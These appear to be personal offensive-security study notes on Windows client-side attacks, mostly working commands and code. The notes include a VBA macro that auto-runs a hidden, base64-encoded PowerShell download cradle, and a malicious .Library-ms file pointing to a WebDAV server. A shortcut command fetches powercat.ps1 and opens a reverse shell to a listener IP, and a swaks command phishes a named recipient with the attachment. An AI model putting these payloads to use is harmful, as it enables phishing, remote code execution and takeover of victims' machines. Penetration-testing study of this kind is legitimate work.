# Target Reconnaissance
## Information Gathering

- Sweep for files e.g. pdf/ doc with Gobuster pattern
- Read file metadata
  
  ``` exiftool -a -u xxx.pdf ```

# Exploit Microsoft Office
## Macro Abuse
- With old .doc file
- macro func must enabled
- windows use utf-16le base64 decode encode
- smbserver to transfer files:
   
   ``` 
   impacket-smbserver -smb2support share .
   \\ip-address-of-your-linux-machine\SHARE
   ```

- Macro example: 
``` 
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
``` 

- useful post-exploit file transfer: https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/ 

## Execution vis Windows Library Files
- Send email to victim containing 'config,.Library-ms' which direct to malicious wsgidev 
``` 
/home/hoidam/.local/bin/wsgidav --host=0.0.0.0 --port 80 --auth=anonymous --root /home/hoidam/webdav/
```
- Edit IP variable
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- edit the .ink file (shortcut) to run reverse shell
``` 
owershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```

## SMTP tool
Send email with given information e.g. receiver/sender, smtp server usrname pw
- SWAKS
  ``` sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach config.Library-ms --server 192.168.151.199 --body body.txt --header "Subject: Problems" --suppress-data ```